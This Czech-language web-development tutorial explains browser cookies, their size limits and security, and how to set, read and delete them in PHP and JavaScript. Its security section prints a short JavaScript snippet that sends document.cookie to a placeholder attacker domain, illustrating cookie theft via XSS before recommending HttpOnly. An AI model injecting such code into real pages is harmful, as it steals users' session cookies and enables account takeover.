---
title: "Cookies"
headline: "Cookies"
description: "Kdy cookies (ne)používat a jak s nim pracovat v JavaScriptu a PHP."
date: "2014-02-15"
last_modification: "2015-10-15"
status: 1
tags: ["JavaScript", "PHP"]
---

**Cookies** (česky *sušenky*) jsou malé soubory ukládané na straně klienta v prohlížeči.

Jedná se o nejstarší a nejlépe podporovaný způsob ukládání dat u návštěvníka. Tato data se odesílají při požadavku na server, což z nich dělá ideální nástroj pro **identifikaci**. Proto se většina přihlášení na webových stránkách bez cookie neobejde.

Méně domyšlené aplikace na **nemožnost nastavit cookie** vůbec neupozorňují a bez sušenek se tak z *neznámých důvodů* nejde přihlásit.

    - [Zjištění vypnutých cookies](/vypnute-cookies) – jak zjistit, jestli má návštěvník zapnuté nebo vypnuté cookies

Kromě přihlašování uživatelů se cookies hojně používají pro jejich **sledování**. Cookie tak používají měřicí skripty jako je [Google Analytics](/ga) nebo různé reklamní systémy pro lepší cílení reklam.

## Velikost cookies

Z dnešního pohledu je hlavním omezení v používání cookies jejich **omezená velikost**.

Při všech HTTP požadavcích se **odesílají na server** – to limituje jejich velikost a zvětšuje objem přenášených dat.

**Bezpečná velikost** napříč prohlížeči je **4 kB** pro všechny cookies na dané doméně, bezpečný maximální počet sušenek je **20**. Novější prohlížeče mají limity velkorysejší. Do velikosti se kromě samotné **hodnoty** započítává i název cookie, nastavení expirace a podobně.

        - [Browser Cookie Limits](http://browsercookielimits.squawky.net/) – limity v současných prohlížečích

    Kvůli nepotřebnosti přenášení sušenek se někdy servírují statické soubory (styly, skripty, obrázky), které cookies k ničemu nevyžadují, z jiné domény.

## Kdy používat cookie

V dnešní době je prakticky jediný rozumný případ užití sušenek **identifikace uživatele** mezi klientem a serverem. Nebo funkce **trvalé přihlášení**.

Po ověření přihlašovacích údajů se v prohlížeči uloží identifikátor, který se následně posílá s každým požadavkem. Server podle toho pozná, kdo je přihlášen a pošle mu příslušná data.

Přes *cookies* typicky fungují i [*session* v PHP](http://pehapko.cz/programujeme-v-php/sessions). V prohlížeči je cookie s názvem  `PHPSESSID`, kde je hodnota propojující prohlížeč s daty na serveru.

Pro případy, kdy není nutné cookie neustále odesílat na server, je lepší používat **lokální úložiště**.

    - [Úložiště `localStorage`](/localstorage) – úložiště v prohlížeči klienta přístupné JavaScriptem

Do toho se vejde více dat, takže je vhodné pro věci jako je ukládání **lokálního nastavení stránky** nebo [zálohy rozepsaných formulářů](/zalohovani-formularu). V případě potřeby se potom může jeho obsah přenést na server [AJAXem](/ajax).

Teoreticky by šly cookies vyměnit za `localStorage`, ale bylo by to zbytečně [závislé na JavaScriptu](/bez-javascriptu). Nezávislost na JS je drobná výhoda cookies oproti lokálnímu úložišti.

## Bezpečnost cookies

Jelikož jsou cookies uloženy na disku uživatele, kdokoliv se k jeho počítači dostane, může se potom **kdekoliv přihlásit**, aniž by znal heslo.

Některé služby se tomuto problému snaží předcházet tak, že každá cookie pro trvalé přihlášení je platná pouze pro daný prohlížeč. Jednotlivé prohlížeče v kombinaci s operačním systémem, nainstalovanými pluginy a fonty vytváří relativně **unikátní otisk**, který jde ověřovat.

Často ale vítězí pohodlí uživatelů, kteří typicky dávají přednost zbytečnému neodhlašování před snížením risika krádeže cookie.

### Krádež cookie JavaScriptem

Zjistit cookie potřebnou pro přihlášení jde někdy i pomocí JS. Pokud se na cizí stránku podaří propašovat vlastní JS kód, může jít získat cookie přihlášeného uživatele:

    - [Využití XSS chyby](/xss) – jak je možné využít XSS díru na webové stránce 

Cookie si lze snadno přenést na vlastní server.

```
var ping = new Image();
ping.src = "http://domena-utocnika.cz/?" + 
            encodeURI(document.cookie);
```

Kromě opravení XSS díry je řešení nastavit sušenky jako `HttpOnly`. Potom se k nim JavaScript vůbec nedostane.

## Jak zobrazit cookie?

Podívat se na cookie, které jsou pro danou stránku nastaveny, jde ve [vývojářských nástrojích](/vyvojarske-nastroje) (klávesa F12).

V **Chrome** jsou na kartě *Resources*:

Sušenky tam jde pouze mazat. Pro upravování je potřeba rozšíření. Na obrázku jsou cookies, které přidává Google Analytics.

## Testování

Jelikož cookies ovlivňují chování aplikace, může se při vývoji stát, že se stránka bude chovat neočekávávaně. Na vině mohou být dříve nastavené sušenky se špatnou hodnotou.

Proto je dobré čas od času cookies promazat nebo **aplikaci otevřít v anonymním okně** – Ctrl + Shift + N v **Chrome**/**Opeře** a Ctrl + Shift + P pro **Firefox**/[**Edge**](/microsoft-edge).

U anonymního okna si je třeba uvědomit, že otevření další záložky už bude vidět cookie vytvořené v první záložce, takže i anonymní okno je potřeba občas otevřít znovu.

## Cookies v PHP

Cookie se v PHP nastaví funkcí `[setcookie](http://www.php.net/manual/en/function.setcookie.php)`:

```
setcookie(
  "nazev-cookie", 
  $hodnota,
  strtotime('+1 years')
);
```

První parametr je název, druhý hodnota cookie a třetí **platnost**. Platnost je nepovinná, ale bez jejího uvedení cookie zanikne po zavření prohlížeče. Nastavení platnosti jde provést docela elegantně funkcí `strtotime`.

Nepovinná je i hodnota sušenky.

Dále jde uvést ještě cestu a doménu, kde sušenka platí, funkčnost jen na [HTTPS](/https) a příznak `httponly`, aby se ke cookie nedalo dostat JavaScriptem.

```
setcookie(
  "nazev-cookie", 
  $hodnota,
  strtotime('+1 years'), // platnost
  "", // path
  "", // domain
  false, // HTTPS
  **true** // httponly
);
```

Nastavit chování sušenek globálně jde funkcí `[session_set_cookie_params](http://www.php.net/manual/en/function.session-set-cookie-params.php)`.

### Přečtení cookie v PHP

Sušenky jsou potom přístupné v poli `$_COOKIE`.

```
&lt;?php echo $_COOKIE["nazev"] ?>
```

### Smazání cookie

```
setcookie("nazev", "", 1);
```

## Cookies v JavaScriptu

V JS prakticky není důvod cookie používat. Snad jen kvůli jejich snadnému a automatickému přenášení na server v situaci, kdy **nepřenesení dat není kritické**.

Po nastavení cookie JavaScriptem je totiž ještě nutné provést HTTP požadavek, aby se informace přenesla na server.

Lepší je používat [`localStorage`](/localstorage), které není tak datově limitující, nemá omezenou dobu platnosti a má pohodlnější rozhraní pro používání.

### Nastavení cookie v JS

Vytvoření cookie v prostém JS s dlouhou platností vypadá následovně:

```
document.cookie = 
  "nazev=hodnota; expires=Fri, 31 Dec 9999 23:59:59 GMT";
```

Ne všechny prohlížeče nastaví této cookie platnost na rok 9999.

Pokud se má cookie smazat po zavření prohlížeče, nemusí se expirace uvádět:

```
document.cookie = "nazev=hodnota";
```

### Smazání cookie

Smazání proběhne nastavením expirace do minulosti.

```
document.cookie = 
  "nazev=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
```

### Přečtení cookie v JS

Nejkomplikovanější je získat hodnotu cookie podle názvu.

Rychlé a ne 100% spolehlivé řešení na testování přítomnosti cookie je:

```
if (document.cookie.indexOf("nazev=hodnota") == -1) {
  // cookie „nazev“ s hodnotou „hodnota“ neexistuje
}
else {
  // existuje
}
```

Pro získání konkrétní hodnoty je potom nutné projít řetězec obsahující všechny cookie na stránce, ten vypadá nějak takto:

```
nazev=hodnota; nazev2=hodnota2
```

Nezbývá tedy než řetězec rozsekat podle „`; `“, projít [cyklem](/js-cykly), rozdělit podle „`=`“ a porovnat z názvem a případně vrátit hodnotu:

```
function precistCookie(nazev) {
    var susenky = document.cookie.split("; ");
    for (var i in susenky) {
        susenka = susenky[i].split("=");
        if (susenka[0] == nazev) {
            return susenka[1];
        }
    }
    return false;
}
```

### Pokročilejší hotové řešení

Pro pohodlnější práci s cookie jde použít menší framework z MDN:

    - [A little framework: a complete cookies reader/writer with full unicode support](https://developer.mozilla.org/en-US/docs/Web/API/document/cookie#A_little_framework_a_complete_cookies_readerwriter_with_full_unicode_support)